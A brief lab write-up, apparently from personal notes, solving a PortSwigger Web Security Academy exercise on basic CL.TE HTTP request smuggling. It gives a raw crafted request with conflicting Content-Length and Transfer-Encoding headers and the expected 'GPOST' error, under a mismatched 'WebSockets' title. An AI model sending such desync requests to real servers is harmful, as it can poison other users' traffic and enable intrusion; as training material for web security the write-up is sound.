<!-- omit in toc -->
# WebSockets

<!-- omit in toc -->
## Table of Contents

- [HTTP request smuggling, basic CL.TE vulnerability](#http-request-smuggling-basic-clte-vulnerability)

## HTTP request smuggling, basic CL.TE vulnerability
Reference: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

<!-- omit in toc -->
### Quick Solution
As said in the title this website is vulnerable to a simple CL.TE vulnerability. Everything in the next paragraph.

<!-- omit in toc -->
### Solution
Using Burp Repeater, issue the following request twice:

```
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
The second response should say: ``Unrecognized method GPOST``.
